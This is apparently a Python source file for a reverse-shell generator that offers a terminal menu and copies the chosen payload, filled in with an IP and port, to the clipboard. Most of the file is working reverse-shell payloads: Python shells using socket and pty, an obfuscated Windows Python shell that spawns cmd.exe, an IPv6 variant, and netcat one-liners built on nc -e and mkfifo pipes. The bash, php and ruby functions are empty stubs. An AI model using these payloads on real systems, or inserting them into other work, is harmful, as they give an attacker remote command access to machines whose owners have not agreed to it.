import pyperclip
from simple_term_menu import TerminalMenu

languages = {
    "python": ["python", "py", "py3"],
    "netcat": ["nc", "netcat"],
    "bash": ["sh", "bash"],
    "php": ["php"],
    "ruby": ["ruby"],
}


def lang_handler(lang, option):
    for key, values in languages.items():
        for value in values:
            if lang in value:
                if key == "python":
                    rs = python(option)
                    return rs
                elif key == "netcat":
                    rs = netcat(option)
                    return rs
                elif key == "bash":
                    rs = bash(option)
                    return rs
                elif key == "php":
                    rs = php(option)
                    return rs
                elif key == "ruby":
                    rs = ruby(option)
                    return rs
                else:
                    raise NotImplementedError


def python(option=""):

    python_rs = [
        r"""export RHOST="{}";export RPORT={};python -c \'import socket,os,pty;s=
        socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[
        os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'""",
        r"""C:\Python27\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[
        (s.connect(('{}', {})), [[[(s2p_thread.start(), [[(p2s_thr
        ead.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__
        (None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except',
         (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value
         , __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt)
         and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])}})(),
         type('try', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __
         exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __
         after: __after()))[1])]][0]}})())))([None]))[1] for p2s_thread.daemon in [(True)]]
         [0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1]
          for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread
          (target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32
          \\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]]
          [0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for
          __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda
          __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __
          after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 'p2s')]][0]
          for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y
          (lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after(
          ))[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in
          [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'],
          __l['p'] in [(s, p)]][0])({{}}), 's2p')]][0] for __g['os'] in [(__import__('os', __
          g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __
          g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading']
           in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y
           : f(lambda: y(y)()))), globals(), __import__('contextlib'))\"""",
        """python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);
        s.connect(("{}",{},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'""",
    ]

    if option is True:
        rs = python_rs[0]
    else:
        options_python_rs = [
            "Generic Python Reverse Shell",
            "Windows Only Python Reverse Shell",
            "IPV6 Reverse Shell",
        ]
        terminal_menu_lang = TerminalMenu(
            options_python_rs, title="Python Reverse Shell"
        )
        option = terminal_menu_lang.show()
        rs = python_rs[option]

    return rs


def netcat(option=""):

    netcat_rs = [
        "nc -e /bin/sh {} {}",
        "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
        "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
    ]

    if option is True:
        rs = netcat_rs[0]
    else:
        options_netcat_rs = [
            "Basic Netcat Reverse Shell",
            "Netcat OpenBsd Reverse Shell",
            "Netcat BusyBox Reverse Shell",
        ]
        terminal_menu_lang = TerminalMenu(
            options_netcat_rs, title="Netcat Reverse Shell"
        )
        option = terminal_menu_lang.show()
        rs = netcat_rs[option]

    return rs


def bash(option=""):
    pass


def php(option=""):
    pass


def ruby(option=""):
    pass


# This function will put the reverse shell into the clipboard of the system.
def provide_rs(rs, ip, port):
    # print("Reverse Shell is now in clipboard.")
    pyperclip.copy(f"{rs.format(ip,port)}")
